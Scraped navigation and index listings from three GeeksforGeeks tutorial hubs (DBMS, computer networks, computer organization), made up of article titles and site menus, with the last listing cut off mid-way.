keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Basicsexpand_moreDatabase Management System (DBMS)Introduction of DBMS (Database Management System) | Set 1Introduction of 3-Tier Architecture in DBMS | Set 2DBMS Architecture 2-Level, 3-LevelNeed for DBMSAdvantages of DBMS over File systemEconomic factors (Choice of DBMS)Data Abstraction and Data IndependenceIntroduction of ER ModelRecursive Relationships in ER diagramsMinimization of ER DiagramsEnhanced ER ModelMapping from ER Model to Relational ModelRelational model (relational algebra, tuple calculus)expand_moreRelational Model in DBMSIntroduction of Relational Algebra in DBMSAnomalies in Relational ModelIntroduction of Relational Model and Codd Rules in DBMSTypes of Keys in Relational Model (Candidate, Super, Primary, Alternate and Foreign)Basic Operators in Relational AlgebraExtended Operators in Relational AlgebraTuple Relational Calculus (TRC) in DBMSHow to solve Relational Algebra problems for GATEDifference between Row oriented and Column oriented data stores in DBMSDatabase design (integrity constraints, normal forms)expand_moreIntroduction of Database NormalizationNormal Forms in DBMSFunctional Dependency and Attribute ClosureFinding Attribute Closure and Candidate Keys using Functional DependenciesNumber of possible Superkeys in DBMSLossless Decomposition in DBMSDatabase Management System | Dependency Preserving DecompositionLossless Join and Dependency Preserving DecompositionHow to find the highest normal form of a relationMinimum relations satisfying First Normal Form (1NF)Equivalence of Functional DependenciesArmstrong’s Axioms in Functional Dependency in DBMSCanonical Cover of Functional Dependencies in DBMSDenormalization in DatabasesIntroduction of 4th and 5th Normal form in DBMSQuery languages (SQL)expand_moreStructured Query Language (SQL)Inner Join vs Outer JoinHaving vs Where Clause in SQLDatabase Objects in DBMSNested Queries in SQLJoin operation Vs Nested query in DBMSIndexing in Databases | Set 1SQL queries on clustered and non-clustered IndexesSQL TutorialTransactions and concurrency controlexpand_moreConcurrency Control in DBMSDatabase Recovery Techniques in DBMSACID Properties in DBMSLog based Recovery in DBMSWhy recovery is needed in DBMSTransaction Isolation Levels in DBMSTypes of Schedules in DBMSTypes of Schedules based Recoverability in DBMSConflict Serializability in DBMSPrecedence Graph For Testing Conflict Serializability in DBMSCondition of schedules to View-equivalentRecoverability in DBMSDeadlock in DBMSStarvation in DBMSLock Based Concurrency Control Protocol in DBMSTwo Phase Locking ProtocolCategories of Two Phase Locking (Strict, Rigorous & Conservative)Two Phase Locking (2-PL) Concurrency Control Protocol | Set 3Thomas Write Rule in DBMSTimestamp based Concurrency ControlMultiple Granularity Locking in DBMSGraph Based Concurrency Control Protocol in DBMSIntroduction to TimeStamp and Deadlock Prevention Schemes in DBMSImplementation of Locking in DBMSChallenges of database security in DBMSFile structures (sequential files, indexing, B and B+ trees)expand_moreFile Organization in DBMS | Set 1File Organization in DBMS | Set 2File Organization in DBMS | Set 3Introduction of B-TreeInsert Operation in B-TreeDelete Operation in B-TreeIntroduction of B+ TreeRAID (Redundant Arrays of Independent Disks)Data WarehousingData MiningData Replication in DBMSDBMS Quizexpand_moreDatabase Management Systems | Set 1Database Management Systems | Set 2Database Management Systems | Set 3Database Management Systems | Set 4Database Management Systems | Set 5Database Management Systems | Set 6Database Management Systems | Set 7Database Management Systems | Set 8Database Management Systems | Set 9Database Management Systems | Set 10DBMS GATE Questionsexpand_moreER and Relational ModelsDatabase Design(Normal Forms)SQLTransactions and concurrency controlFile structures (sequential files, indexing, B and B+ trees) Database Management System (DBMS) ‘Recent Articles’ on DBMS ! Introduction Entity Relationship Model Relational Model Relational Algebra Functional Dependencies Normalisation Transactions and Concurrency Control Indexing, B and B+ trees File Organization Advanced Topics SQL Quick Links Introduction : DBMS Introduction | Set 1 DBMS Introduction | Set 2 (3-Tier Architecture) DBMS Architecture 2-level 3-level Need For DBMS Data Abstraction and Data Independence Database Objects Multimedia Database Interfaces Categories of End Users Use of DBMS in System Software Choice of DBMS | Economic factors Disadvantages of DBMS Entity Relationship Model : ER Model Enhanced ER Model Minimization of ER Diagram ER Model: Generalization, Specialization and Aggregation Recursive Relationships Impedance Mismatch Relational Model : Relational Model and CODD Rules Relational Model Keys in Relational Model (Candidate, Super, Primary, Alternate and Foreign) Number of possible Superkeys Anomalies in Relational Model Mapping from ER Model to Relational Model Strategies for Schema design Schema Integration Star Schema in Data Warehouse modeling Data Warehouse Modeling | Snowflake Schema Dimensional Data Modeling >> Quiz on ER and Relational Model Relational Algebra : Introduction Basic Operators Extended Operators Inner Join vs Outer Join Join operation Vs nested query DBMS | Tupple Relational Calculus Row oriented vs. column oriented data stores How to solve Relational Algebra Problems for GATE How to Solve Relational Algebra Problems for GATE Functional Dependencies : Functional Dependency and Attribute Closure Finding Attribute Closure and Candidate Keys using Functional Dependencies Armstrong’s Axioms in Functional Dependency Equivalence of Functional Dependencies Canonical Cover Normalisation : Introduction Normal Forms Minimum relations satisfying 1NF The Problem of redundancy in Database Dependency Preserving Decomposition Lossless Join Decomposition LossLess Join and Dependency Preserving Decomposition How to find the Highest Normal Form of a Relation Domain Key normal form Introduction of 4th and 5th Normal form Denormalization in Databases DBMS | Data Replication >> Quiz on Normal Forms Transactions and Concurrency Control : Introduction ACID Properties Concurrency Control -Introduction Implementation of Locking in DBMS Concurrency Control Protocols – Lock Based Protocol Concurrency Control Protocol | Graph Based Protocol Concurrency Control Protocol | Two Phase Locking (2-PL)-I Concurrency Control Protocol | Two Phase Locking (2-PL)-II Concurrency Control Protocol | Two Phase Locking (2-PL)-III Concurrency Control Protocol | Multiple Granularity Locking Concurrency Control Protocol | Thomas Write Rule Concurrency Control | Polygraph to check View Serializabilty DBMS | Log based recovery Timestamp Ordering Protocols Introduction to TimeStamp and Deadlock Prevention Schemes Dirty read in SQL Types of Schedules Conflict Serializability View Serializability How to test if two schedules are View Equal or not ? Recoverability of Schedules Precedence Graph for testing Conflict Serializabilty Transaction Isolation Levels in DBMS Database Recovery Techniques Starvation in DBMS Deadlock in DBMS DBMS | OLAP vs OLTP Types of OLAP Systems DBMS | Types of Recoverability of Schedules and easiest way to test schedule | Set 2 Web Information Retrieval | Vector Space Model Why recovery is needed? >> Quiz on Transactions and concurrency control Indexing, B and B+ trees : Indexing and its Types B-Tree | Set 1 (Introduction) B-Tree | Set 2 (Insert) B-Tree | Set 3 (Delete) B+ Tree (Introduction) Bitmap Indexing Inverted Index Difference between Inverted Index and Forward Index SQL queries on clustered and non-clustered Indexes >> Practice questions on B and B+ Trees >> Quizzes on Indexing, B and B+ Trees File Organization: File Organization – Set 1 File Organization – Set 2 (Hashing in DBMS) File Organization – Set 3 File Organization – Set 4 >> Quiz on File structures Advanced Topics : RAID Query Optimization How to store a password in database? Storage Area Networks Network attached storage Data Warehousing Data Warehouse Architecture Characteristics and Functions of Data warehouse Difficulties of Implementing Data Warehouses Data Mining Data Mining | KDD process Data Mining | Sources of Data that can be mined Data Marts ODBMS – Definition and overview Architecture of HBase Apache HBase Architecture and Working of Hive Apache Hive Difference between Hive and HBase Difference between RDBMS and HBase Challenges of database security Federated database management system issues Distributed Database System Functions of Distributed Database System Semantic Heterogeneity Advantages of Distributed database Comparison – Centralized, Decentralized and Distributed Systems Characteristics of Biological Data (Genome Data Management) Data Management issues in Mobile database Future Works in Geographic Information System Difference between Structured, Semi-structured and Unstructured data SQL Tutorial SQL | Tutorials Quiz on SQL DBMS practices questions : Database Management Systems | Set 1 Database Management Systems | Set 2 Database Management Systems | Set 3 Database Management Systems | Set 4 Database Management Systems | Set 5 Database Management Systems | Set 6 Database Management Systems | Set 7 Database Management Systems | Set 8 Database Management Systems | Set 9 Database Management Systems | Set 10 Database Management Systems | Set 11 Quick Links : Last Minutes Notes(LMNs) on DBMS Quizzes on DBMS ! ‘Practice Problems’ on DBMS ! DBMS interview questions | Set 1 DBMS interview questions | Set 2 Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseTypes of Environments in AITop 40 Python Interview Questions & AnswersProof that Clique Decision problem is NP-Complete | Set 2 Most Visited Articles Difference between List VS Set VS Tuple in PythonMajor Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try OnceFibonacci Series Program in JavaScriptHow to send an email from JavaScript ? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Computer Network Tutorials - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Computer Network Fundamentalsexpand_moreComputer Network TutorialsBasics of Computer NetworkingGoals of NetworksTypes of Network TopologyTypes of area networks – LAN, MAN and WANIntroduction of Mobile Ad hoc Network (MANET)Types of MANET in Computer NetworkRedundant Link problems in Computer NetworkDigital Subscriber Line (DSL)What is Scrambling in Digital Electronics ?Difference between Unipolar, Polar and Bipolar Line Coding SchemesManchester Encoding in Computer NetworkLet’s experiment with NetworkingLayers of OSI ModelTCP/IP ModelPhysical layerexpand_moreNetwork Devices (Hub, Repeater, Bridge, Switch, Router, Gateways and Brouter)Types of Transmission MediaTransmission Modes in Computer Networks (Simplex, Half-Duplex and Full-Duplex)Analog to Digital ConversionDigital to Analog ConversionWireless Communication | Set 1Wireless Communication | Set 2Analog to Analog Conversion (Modulation)Difference between Broadband and Baseband TransmissionDesign Issues in Physical LayerData Link layerexpand_moreMultiple Access Protocols in Computer NetworkP2P(Peer To Peer) File SharingFraming in Data Link LayerLAN Technologies | ETHERNETEthernet Frame FormatToken Ring frame formatBit Stuffing in Computer NetworkDifference between Byte stuffing and Bit stuffingHamming Code in Computer NetworkCarrier Sense Multiple Access (CSMA)Controlled Access Protocols in Computer NetworkBack-off Algorithm for CSMA/CDCollision Detection in CSMA/CDEfficiency of CSMA/CDEfficiency Of Token RingError Detection in Computer NetworksStop and Wait ARQSliding Window Protocol | Set 1 (Sender Side)Sliding Window Protocol | Set 2 (Receiver Side)Sliding Window Protocol | Set 3 (Selective Repeat)Sliding Window protocols Summary With QuestionsProgram to remotely Power On a PC over the internet using the Wake-on-LAN protocol.Program to calculate the Round Trip Time (RTT)Introduction of MAC Address in Computer NetworkCollision Avoidance in wireless networksMaximum Data Rate (channel capacity) for Noiseless and Noisy channelsTypes of switches in Computer NetworkNetwork layerexpand_moreIntroduction of InternetworkingLine Configuration in Computer NetworksDifference between Unicast, Broadcast and Multicast in Computer NetworkCollision Domain and Broadcast Domain in Computer NetworkIntroduction of Classful IP AddressingIntroduction and IPv4 Datagram HeaderIPv4 Datagram Fragmentation and DelaysFragmentation at Network LayerInternet Protocol version 6 (IPv6)Internet Protocol version 6 (IPv6) HeaderIP Addressing | Classless AddressingSupernetting in Network LayerLongest Prefix Matching in RoutersProgram to determine class, Network and Host ID of an IPv4 addressC Program to find IP Address, Subnet Mask & Default GatewayIPv4 Classless Subnet equationIntroduction of Variable Length Subnet Mask (VLSM)Network Address Translation (NAT)Types of Network Address Translation (NAT)Classification of Routing AlgorithmsTypes of RoutingClasses of Routing ProtocolsDifference between Distance vector routing and Link State routingFixed and Flooding Routing algorithmsRouting v/s Routed Protocols in Computer NetworkUnicast Routing – Link State RoutingDistance Vector Routing (DVR) ProtocolRoute Poisoning and Count to infinity problem in RoutingOnion RoutingConfiguration of Router on a stickInternet Control Message Protocol (ICMP)Hot Standby Router Protocol (HSRP)Open Shortest Path First (OSPF) Protocol fundamentalsOpen Shortest Path First (OSPF) protocol StatesOpen shortest path first (OSPF) router roles and configurationRoot Bridge Election in Spanning Tree ProtocolTypes of Spanning Tree Protocol (STP)EIGRP fundamentalsFeatures of Enhanced Interior Gateway Routing Protocol (EIGRP)Routing Information Protocol (RIP)Routing Information Protocol (RIP) V1 & V2Link State Advertisement (LSA)Administrative Distance (AD) and Autonomous System (AS)Circuit Switching in Computer NetworkPacket Switching and Delays in Computer NetworkDifferences between Virtual Circuits and Datagram NetworksDifference between Circuit Switching and Packet SwitchingTraceroute in Network LayerHow Address Resolution Protocol (ARP) works?ARP, Reverse ARP(RARP), Inverse ARP (InARP), Proxy ARP and Gratuitous ARPPacket flow in the same NetworkPacket flow in different NetworkDifference between layer-2 and layer-3 switchesDifference between Ping and TracerouteServers in Computer NetworkWhat is Local Host?Transport layerexpand_moreTransport Layer responsibilitiesCongestion Control in Computer NetworksComputer Network | Leaky bucket algorithmServices and Segment structure in TCPTCP Congestion ControlTCP 3-Way Handshake ProcessTCP Connection EstablishmentTCP Connection TerminationError Control in TCPTCP TimersTCP flagsTCP Server-Client implementation in CUser Datagram Protocol (UDP)Differences between TCP and UDPMultiplexing and Demultiplexing in Transport LayerApplication layerexpand_moreProtocols in Application LayerDomain Name System (DNS) in Application LayerAddress Resolution in DNS (Domain Name Server)DNS Spoofing or DNS Cache poisoningWhy does DNS use UDP and not TCP?Dynamic Host Configuration Protocol (DHCP)DHCP Relay Agent in Computer NetworkHow DHCP server dynamically assigns IP address to a host?Simple Network Management Protocol (SNMP)Simple Mail Transfer Protocol (SMTP)File Transfer Protocol (FTP) in Application LayerHTTP Non-Persistent & Persistent Connection | Set 1Multipurpose Internet Mail Extension (MIME) ProtocolDifference between http:// and https://Difference between HTML and HTTPWhat’s difference between The Internet and The Web ?Basics of Wi-FiWifi protected setup (WPS)Wifi protected access (WPA)Difference between LiFi and WiFiNetwork Securityexpand_moreBasic Network Attacks in Computer NetworkTypes of VirusesIntroduction of Firewall in Computer NetworkZone-based firewallFirewall methodologiesDenial of Service and PreventionIntroduction to Crypto-terminologiesDenial of Service DDoS attackTypes of DNS Attacks and Tactics for SecurityActive and Passive attacks in Information SecurityBirthday attack in CryptographyDigital Signatures and CertificatesLZW (Lempel–Ziv–Welch) Compression techniqueRC4 Encryption AlgorithmRC5 Encryption AlgorithmSHA-512 Hash In JavaRSA Algorithm in CryptographyRSA Algorithm using Multiple Precision Arithmetic LibraryWeak RSA decryption with Chinese-remainder theoremImplementation of Diffie-Hellman AlgorithmDNA CryptographyPort Security in Computer NetworkUnicode in Computer NetworkMessage Authentication CodesHow message authentication code works?System SecurityHash Functions in System SecurityThe CIA triad in CryptographyImage Steganography in CryptographyAccess-Lists (ACL)Data encryption standard (DES) | Set 1Difference between AES and DES ciphersComputer Network Quizesexpand_moreComputer Networks | Set 1Computer Networks | Set 2Computer Networks | Set 3Computer Networks | Set 4Computer Networks | Set 5Computer Networks | Set 6Computer Networks | Set 7Computer Networks | Set 8Computer Networks | Set 9Computer Networks | Set 10Computer Network GATE Questionsexpand_moreMisc Topics in Computer NetworksCN Data Link LayerNetwork LayerIP AddressingTransport LayerHTTP Non-Persistent & Persistent Connection | Set 2 (Practice Question)Application LayerNetwork Security Computer Network Tutorials Recent Articles on Computer Networks Basics Data Link Layer Network Layer Transport Layer Application Layer Network Security and Cryptography Compression Techniques Network Experiments Devices Misc Basics : Basics of Computer Networking The Internet and the Web Internet and Web programming: Behind the scenes The New Internet | Internet of Everything Unknown facts of Networking Network goals Line Configuration in Computer Networks Transmission Modes in Computer Networks Types of Transmission Media Unicast, Broadcast and Multicast Introduction to basic Networking terminology Network Topologies Types of area networks – LAN, MAN and WAN Telecom Networks Access networks TCP/IP Model Layers of OSI Model Introduction to Active Directory Domain Service Advantages and Disadvantages of Computer Networking Data Link Layer : Local Area Network (LAN) Technologies. Computer Network | Bridges (local Internetworking device) Internetworking Framing In Data Link Layer Introduction of MAC Address MAC Filtering Multiple Access Protocols Ethernet Frame Format EtherChannel Difference between Byte stuffing and Bit stuffing Implementing Byte stuffing using Java Circuit Switching Packet Switching and Delays Circuit Switching VS Packet Switching Differences between Virtual Circuits & Datagram Networks Switching techniques: Message switching Types of switches Maximum data rate (channel capacity) for noiseless and noisy channels Hot Spot 2.0 Collision Avoidance in wireless networks Traditional wireless mobile communication Carrier sense multiple access (CSMA) Collision Detection in CSMA/CD Efficiency of CSMA/CD Back-off Algorithm for CSMA/CD Controlled Access Protocols Virtual LAN (VLAN) Inter VLAN Routing by Layer 3 Switch Computer Network | Private VLAN Computer Network | VLAN ACL (VACL) Access and trunk ports Role-based access control Port security Inter-Switch Link (ISL) and IEEE 802.1Q Dynamic Trunking Protocol (DTP) Sliding Window Protocol | Set 1 (Sender Side) Sliding Window Protocol | Set 2 (Receiver Side) Sliding Window Protocol | Set 3 (Selective Repeat) Sliding Window protocols Summary Stop and Wait ARQ Difference between Stop and Wait, GoBackN and Selective Repeat Manchester Encoding Error Detection Hamming Code Program to remotely Power On a PC over the Internet using the Wake-on-LAN protocol. Basics of Wi-Fi IEEE 802.11 Mac Frame Efficiency Of Token Ring Token Bus (IEEE 802.4) Multiplexing (Channel Sharing) Frequency division and Time division multiplexing >> Quiz on Data Link Layer Network Layer : Integrated services digital network (ISDN) Introduction and IPv4 Datagram Header IP Addressing | Introduction and Classful Addressing IP Addressing | Classless Addressing IPv4 classless Subnet equation Supernetting Ipv4 Datagram Fragmentation and Delays Fragmentation at Network Layer Internet Protocol v6 | IPv6 Internet Protocol version 6 (IPv6) Header Differences between IPv4 and IPv6 Internet Control Message Protocol (ICMP) Longest Prefix Matching in Routers Routing v/s Routed Protocols Fixed and Flooding Routing algorithms Classes of routing protocols Types of routing Classification of Routing Algorithms Routing Protocols Set 1 (Distance Vector Routing) Route Poisoning and Count to infinity problem Redundant link problems Administrative Distance (AD) and Autonomous System (AS) Unicast Routing – Link State Routing Link state advertisement (LSA) Securing Routing Protocols Distance vector routing v/s Link state routing Routing Information Protocol (RIP) Routing Interface Protocol (RIP) V1 & V2 Redistribution EIGRP fundamentals EIGRP Configuration Features of Enhanced Interior Gateway Routing Protocol (EIGRP) EIGRP cost calculation Open shortest path first (OSPF) protocol fundamentals Open shortest path first (OSPF) router roles and configuration Open shortest path first (OSPF) protocol States Open shortest path first (OSPF) – Set 2 Probabilistic shortest path routing algorithm for optical networks Types of Spanning Tree Protocol (STP) Network address translation (NAT) Types of Network address translation (NAT) Static NAT (on ASA) Dynamic NAT (on ASA) VRRP(Virtual Router Redundancy Protocol) | Introduction and configuration Hot Standby Router Protocol (HSRP) Hot Standby Router Protocol (HSRP) and Virtual Router Redundancy Protocol (VRRP) Router on a stick | Introduction and Configuration Traceroute What’s difference between Ping and Traceroute? ARP, Reverse ARP(RARP), Inverse ARP(InARP), Proxy ARP and Gratuitous ARP How ARP works? Packet flow in the same network Packet flow in different network Wifi protected access (WPA) Wifi protected setup (WPS) LiFi vs. WiFi Service Set Identifier (SSID) Access-lists (ACL) Context based access control (CBAC) Standard Access-list Extended access-list Reflexive Access-list Time based access-list AAA (Authentication, Authorization and Accounting) AAA (authentication) configuration (locally) Challenge Response Authentication Mechanism (CRAM) Synchronous Optical Network (SONET) RADIUS TACACS+ TACACS+ and RADIUS >> Quiz on Network Layer >> Quiz on IP addressing Transport Layer : TCP Connection Establishment TCP 3-Way Handshake Process TCP Timers TCP Connection Termination TCP Sequence Number | Wrap Around Concept Transport Layer responsibilities Multiplexing and Demultiplexing in Transport Layer User Datagram Protocol (UDP) P2P(Peer To Peer) File Sharing Congestion Control TCP Congestion Control Congestion control techniques Leaky Bucket Algorithm Error Control in TCP TCP flags TCP | Services and Segment structure TCP Server-Client implementation in C TCP and UDP server using select Servers >> Quiz on Transport Layer Application Layer : Protocols in Application Layer Simple Mail Transfer Protocol (SMTP) DNS (Domain Name Server) Why does DNS use UDP and not TCP? Address Resolution in DNS DNS Spoofing or DNS Cache poisoning Types of DNS Attacks and Tactics for Security What’s difference between http:// and https:// ? What’s difference between HTML and HTTP ? HTTP Non-Persistent & Persistent Connection | Set 1 File Transfer Protocol (FTP) What are the differences between HTTP, FTP, and SMTP? Asynchronous Transfer Mode (ATM) What is Local Host? Dynamic Host Configuration Protocol (DHCP) DHCP Relay Agent How DHCP server dynamically assigns IP address to a host? What’s difference between The Internet and The Web ? Simple network management protocol (SNMP) Multipurpose Internet mail extension (MIME) Computer Network | MIME Media Types Quality of Service and Multimedia Web Caching and the Conditional GET Statements >> Quiz on Application Layer Network Security and Cryptography : The CIA triad Introduction to Firewall Types of firewall and possible attacks Firewall methodologies Zone-based firewall Zone-based firewall (Configuration) How to setup firewall in Linux? Message Authentication Codes How message authentication code works? HMAC Algorithm Password authentication protocol (PAP) Basic Network Attacks Birthday attack Vishing (Voice Phishing) System security Private Browsing Threat Modelling DFD Based Threat modelling | Set 1 DFD Based Threat Modelling | Set 2 Types of Viruses Deniel of Service and Prevention Denial of Service DDoS attack Unicode RC4 Encryption Algorithm RSA Algorithm in Cryptography RSA Algorithm using Multiple Precision Arithmetic Library Weak RSA decryption with Chinese-remainder theorem How to solve RSA Algorithm Problems? Hash Functions in System Security DNA Cryptography RC5 Encryption Algorithm ElGamal Encryption Algorithm Caesar Cipher Cryptography Introduction Cryptography | Traditional Symmetric Ciphers Block cipher modes of operation Cryptography | Development of Cryptography Difference between AES and DES ciphers Transforming a Plain Text message to Cipher Text What is a cryptocurrency? Introduction to Crypto-terminologies Quantum Cryptography End to End Encryption (E2EE) in Computer Networks IP security (IPSec) What is Packet Sniffing ? Introduction to Sniffers Data encryption standard (DES) | Set 1 End to End Encryption (E2EE) in Computer Network Types of Security attacks | Active and Passive attacks Types of Wireless and Mobile Device Attacks Types of Email Attacks Sybil Attack Malware and its types >> Quiz on Network Security and Cryptography Compression Techniques : LZW (Lempel–Ziv–Welch) Compression technique Data Compression With Arithmetic Coding Shannon-Fano Algorithm for Data Compression Network Experiments : Let’s experiment with Networking Mobile Ad hoc Network Types of MANET Simple Chat Room using Python Socket Programming in Java C Program to find IP Address, Subnet Mask & Default Gateway Introduction to variable length subnet mask (VLSM) Extracting MAC address using Python Implementation of Diffie-Hellman Algorithm Java Implementation of Deffi-Hellman Algorithm between Client and Server Socket Programming in Python Socket Programming with Multi-threading in Python Cyclic Redundancy Check in Python Explicitly assigning port number to client in Socket Netstat command in Linux: nslookup command in Linux with Examples UDP Server-Client implementation in C C program for file Transfer using UDP Java program to find IP address of your computer Finding IP address of a URL in Java Program to calculate the Round Trip Time (RTT) Network configuration and trouble shooting commands in Linux Implementing Checksum Using Java C Program to display hostname and IP address Program to determine class, Network and Host ID of an IPv4 address Program to determine Class, Broadcast address and Network address of an IPv4 address Program for IP forwarding table lookup Wi-Fi Password of All Connected Networks in Windows/Linux Devices : Network Devices (Hub, Repeater, Bridge, Switch, Router and Gateways) Inside a Router Bridges (local Internetworking device) Switch functions at layer 2 Collision Domain and Broadcast Domain Root Bridge Election in Spanning Tree Protocol Misc : Onion Routing Types of Server Virtualization Cloud Computing | Characteristics of Virtualization On-premises cost estimates of Virtualization Hardware Based Virtualization Operating system based Virtualization Digital Subscriber Line (DSL) Image Steganography Network Neutrality Basics of NS2 and Otcl/tcl script Voice over Internet Protocol (VoIP) Cisco router modes Cisco router basic commands Backing up Cisco IOS router image Basic configuration of adaptive security appliance (ASA) Adaptive security appliance (ASA) features Default flow of traffic (ASA) Cisco ASA Redistribution example Telnet and SSH on Adaptive security appliance (ASA) Near Field Communication (NFC) Relabel-to-front Algorithm Berkeley’s Algorithm Cristian’s Algorithm Universal Serial Bus (USB) in Computer Network Type-C Port in Computer Network Quick Links : Last Minute Notes(LMNs) Quizzes on Computer Networks ! ‘Practice Problems’ on Computer Networks ! My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseTypes of Environments in AIDesign Twitter - A System Design Interview QuestionTop 40 Python Interview Questions & Answers Most Visited Articles Proof that Clique Decision problem is NP-Complete | Set 2Difference between List VS Set VS Tuple in Python5 Common System Design Concepts for Interview PreparationMajor Kernel Functions in Support Vector Machine (SVM)Why non-static variable cannot be referenced from a static method in Java room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Computer Organization and Architecture Tutorials - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Basicsexpand_moreComputer Organization and Architecture TutorialsComputer Organization | Von Neumann architectureComputer Organization | Basic Computer InstructionsComputer Organization | Instruction Formats (Zero, One, Two and Three Address Instruction)Introduction of Stack based CPU OrganizationIntroduction of General Register based CPU OrganizationIntroduction of Single Accumulator based CPU organizationComputer Organization | Problem Solving on Instruction FormatAddressing ModesMachine InstructionsDifference between CALL and JUMP instructionsSimplified Instructional Computer (SIC)Hardware architecture (parallel computing)Computer Architecture | Flynn’s taxonomyGenerations of ComputerComputer Organization | Amdahl’s law and its proofALU, data‐path and control unitexpand_moreIntroduction of Control Unit and its DesignComputer Organization | Hardwired v/s Micro-programmed Control 